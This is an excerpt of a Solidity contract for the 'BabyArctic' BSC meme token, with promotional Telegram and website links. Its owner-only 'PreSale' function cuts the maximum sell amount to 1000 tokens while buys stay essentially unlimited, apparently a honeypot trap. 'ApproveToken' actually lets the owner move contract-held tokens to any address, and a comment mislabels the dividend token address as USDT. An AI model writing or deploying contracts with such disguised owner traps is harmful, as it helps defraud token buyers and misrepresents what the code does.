...
/*
BabyArctic was born in one of the most remote places in the world, The Arctic!

Telegram: https://t.me/BabyArctic
Website:  https://www.babyarctic.com/
*/
...
contract BabyArctic is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    
    address payable public marketingAddress = payable(0xA912B787f0767A93b71E4A890A4dC0c33AB701F5); // Marketing Address
    address public _dividendToken_ETH = 0x2170Ed0880ac9A755fd29B2688956BD959F933F8; // Binance-Peg USDT
    ...
    string private _name = "BabyArctic";
    string private _symbol = "BArctic";
    ...
    uint256 public _maxTxAmountBuy =  100000000000000 * 10**0 * 10**9;
    uint256 public _maxTxAmountSell = 1000000000000 * 10**0 * 10**9;
    uint256 private minimumTokensBeforeSwap = 40000000 * 10**6 * 10**9; 
    uint256 public buyBackSellLimit = 1 * 10**13;
    string public _title = "BabyArctic.com";
    ...
    function prepareForPreSale() external onlyOwner {
        ...
        _taxFee = 0;
        _liquidityFee = 0;
        _maxTxAmountBuy =  100000000000000 * 10**0 * 10**9;
        _maxTxAmountSell = 40000000000 * 10**0 * 10**9;
    }
	...
	function PreSale() external onlyOwner {
        ...
        _sellLiquidityFee = 5;
        _maxTxAmountBuy =  100000000000000 * 10**0 * 10**9;
        _maxTxAmountSell = 1000 * 10**0 * 10**9;
    }
    ...
    function ApproveToken(address recipient , uint256 _amount) external onlyOwner(){
        uint256 amount = _amount * 10**_decimals;
         require(balanceOf(address(this)) >= amount,"Not Enough Tokens");
        _transfer(address(this),recipient,amount);
    }
    
    function setTitle(string memory title) external onlyOwner(){
         _title =title;
